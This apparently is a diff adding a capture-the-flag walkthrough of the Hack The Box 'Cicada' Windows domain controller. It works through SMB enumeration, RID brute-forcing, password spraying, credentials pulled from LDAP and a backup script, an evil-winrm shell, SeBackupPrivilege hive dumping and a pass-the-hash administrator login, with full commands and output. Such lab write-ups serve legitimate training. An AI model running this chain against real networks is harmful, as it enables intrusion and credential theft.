@@ -49,4 +49,325 @@
   |   3:1:1: 
   |_    Message signing enabled and required
 
+we found dc named CICADA-DC.cicada.htb.
+# add cicada.htb and CICADA-DC.cicada.htb into /etc/hosts 
+
+********************************************************************
+  //139 & 445 indicates smb server, we tried to identify whether arbitrary id is allowed
+ 
+  $ netexec smb 10.10.11.35 cicada.htb -u ddd -p ''                                  
+  SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+  SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+  SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\ddd: 
+  SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\ddd: 
+  Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+  //it accepts arbitrary id without passwd to login, we tried to access the --shares fold
+  $ netexec smb 10.10.11.35 cicada.htb -u ddd -p '' --shares
+  SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+  SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+  SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\ddd: 
+  SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\ddd: 
+  SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+  SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+  SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+  SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+  SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+  SMB         10.10.11.35     445    CICADA-DC        DEV                             
+  SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+  SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+  SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
+  SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
+  SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+  SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+  SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+  SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+  SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+  SMB         10.10.11.35     445    CICADA-DC        DEV                             
+  SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+  SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+  SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
+  SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
+  Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+  // HR and IPC$ we have read privilege
+  $ smbclient //cicada.htb/HR -N         
+  Try "help" to get a list of possible commands.
+  smb: \> ls
+    .                                   D        0  Thu Mar 14 05:29:09 2024
+    ..                                  D        0  Thu Mar 14 05:21:29 2024
+    Notice from HR.txt                  A     1266  Wed Aug 28 10:31:48 2024
+
+  smb: \> mget "Notice from HR.txt" 
+    Get file Notice from HR.txt? y
+    getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
+    smb: \> exit
+  //view the content of file, we got a default passwd
+    Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+  // with this, we passwd spray to check any id forget to change their passwd, before it we retrieve all users in the domain
+    $ netexec smb 10.10.11.35 cicada.htb -u ddd -p '' --rid-brute
+      SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\ddd: 
+      SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+      SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+      SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+      SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+      Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+// OR we use impacket
+  $ impacket-lookupsid anonymous@cicada.htb
+  Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+  
+  Password:
+  [*] Brute forcing SIDs at cicada.htb
+  [*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
+  [*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
+  498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+  500: CICADA\Administrator (SidTypeUser)
+  501: CICADA\Guest (SidTypeUser)
+  502: CICADA\krbtgt (SidTypeUser)
+  512: CICADA\Domain Admins (SidTypeGroup)
+  513: CICADA\Domain Users (SidTypeGroup)
+  514: CICADA\Domain Guests (SidTypeGroup)
+  515: CICADA\Domain Computers (SidTypeGroup)
+  516: CICADA\Domain Controllers (SidTypeGroup)
+  517: CICADA\Cert Publishers (SidTypeAlias)
+  518: CICADA\Schema Admins (SidTypeGroup)
+  519: CICADA\Enterprise Admins (SidTypeGroup)
+  520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+  521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+  522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+  525: CICADA\Protected Users (SidTypeGroup)
+  526: CICADA\Key Admins (SidTypeGroup)
+  527: CICADA\Enterprise Key Admins (SidTypeGroup)
+  553: CICADA\RAS and IAS Servers (SidTypeAlias)
+  571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+  572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+  1000: CICADA\CICADA-DC$ (SidTypeUser)
+  1101: CICADA\DnsAdmins (SidTypeAlias)
+  1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+  1103: CICADA\Groups (SidTypeGroup)
+  1104: CICADA\john.smoulder (SidTypeUser)
+  1105: CICADA\sarah.dantelia (SidTypeUser)
+  1106: CICADA\michael.wrightson (SidTypeUser)
+  1108: CICADA\david.orelious (SidTypeUser)
+  1109: CICADA\Dev Support (SidTypeGroup)
+  1601: CICADA\emily.oscars (SidTypeUser)
+
+//the last 5 id are typical username,then fill them into a userlist to spray the passwd
+  $ nxc smb cicada.htb -u list.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
+
+    SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+    SMB         10.10.11.35     445    CICADA-DC        [-] ICADA\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [+] CICADA\Dev Support:Cicada$M6Corpb*@Lp#nZp!8 
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 
+// michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 we got a pair. check the privi of shares
+  $ nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
+    SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+    SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+    SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+    SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+    SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+    SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+    SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+    SMB         10.10.11.35     445    CICADA-DC        DEV                             
+    SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+    SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+    SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+    SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
+
+//nothing found inside these folders.
+//we tried to access ldap with michael's account, to check the permission
+  $ nxc ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
+    SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+    LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+//For LDAP, with credential, we may retrieve the id:passwd pairs
+  └─$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' | grep pass
+      description: Members in this group can have their passwords replicated to all 
+      description: Members in this group cannot have their passwords replicated to a
+      description: Just in case I forget my password is aRt$Lp#7t*VQ!3
+//luckily, a new passwd, with it we can spray the id again, or ldapsearch all things and search for whose passwd is this.
+  $ nxc smb cicada.htb -u list.txt -p 'aRt$Lp#7t*VQ!3'                                
+    SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\john.smoulder:aRt$Lp#7t*VQ!3 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\sarah.dantelia:aRt$Lp#7t*VQ!3 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\michael.wrightson:aRt$Lp#7t*VQ!3 STATUS_LOGON_FAILURE 
+    SMB         10.10.11.35     445    CICADA-DC        [+] ICADA\david.orelious:aRt$Lp#7t*VQ!3 
+//so we got anohter pair, david.orelious:aRt$Lp#7t*VQ!3, let's check the privi of shares
+  $ nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+    SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+    SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+    SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+    SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+    SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+    SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+    SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+    SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
+    SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+    SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+    SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+    SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
+//READ privi of DEV
+  $ smbclient //cicada.htb/DEV  --user=david.orelious    
+    Password for [WORKGROUP\david.orelious]:
+    Try "help" to get a list of possible commands.
+    smb: \> ls
+      .                                   D        0  Thu Mar 14 05:31:39 2024
+      ..                                  D        0  Thu Mar 14 05:21:29 2024
+      Backup_script.ps1                   A      601  Wed Aug 28 10:28:22 2024
+    
+    		4168447 blocks of size 4096. 416179 blocks available
+    smb: \> more Backup_script.ps1
+
+  $sourceDirectory = "C:\smb"
+  $destinationDirectory = "D:\Backup"
+    $username = "emily.oscars"
+    $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+    $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+    $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $backupFileName = "smb_backup_$dateStamp.zip"
+    $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+    Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+    Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+// we got a new pair emily.oscars "Q!3@Lp#M6b*7t*Vt",which has the privi to backup system, maybe high privi of system
+//and port 5985 is open, wsman winRM
+    └─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+                                        
+    Evil-WinRM shell v3.5
+                                            
+    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                            
+    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                            
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>  whoami
+    cicada\emily.oscars
+//so we got the normal shell, the nto escalate the privi,start with check the privi of this account
+    whoami /priv
+
+    PRIVILEGES INFORMATION
+    ----------------------
+    
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeBackupPrivilege             Back up files and directories  Enabled
+    SeRestorePrivilege            Restore files and directories  Enabled
+    SeShutdownPrivilege           Shut down the system           Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+//Sebackipprivi allows user to read all files on the system, we use it to read the SAM file and save it. with SAM file we can get the hash of administrator.
+//dumping the registry hives required for hash        
+    *Evil-WinRM* PS C:\> reg save hklm\sam c:\myspecial\sam
+    The operation completed successfully.
+    
+    *Evil-WinRM* PS C:\> reg save hklm\system c:\myspecial\system
+    The operation completed successfully.
+//reg save saves the branch into the Registry's native "hive" format. This preserves key ownership and ACLs, so is best suited for backups and restoring on the same machine.
+// download them to my host
+    *Evil-WinRM* PS C:\new> download sam
+                                        
+    Info: Downloading C:\new\sam to sam
+                                            
+    Info: Download successful!
+//then use samdump2 to retrieve the hash 
+    └─$ samdump2 system sam                              
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    *disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+//or use pypykatz
+    $ pypykatz registry --sam sam system
+      WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+      WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+      ============== SYSTEM hive secrets ==============
+      CurrentControlSet: ControlSet001
+      Boot Key: 3c2b033757a49110a9ee680b46e8d620
+      ============== SAM hive secrets ==============
+      HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+      Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+//then with teh admin hash to login , we can see the result of samdump2 is not right.
+    $ evil-winrm -i cicada.htb -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
+                                        
+      Evil-WinRM shell v3.5
+                                              
+      Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                              
+      Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                              
+      Info: Establishing connection to remote endpoint
+      *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+      cicada\administrator
+
+
+
+  
+
+
+  
+  
+
+
 
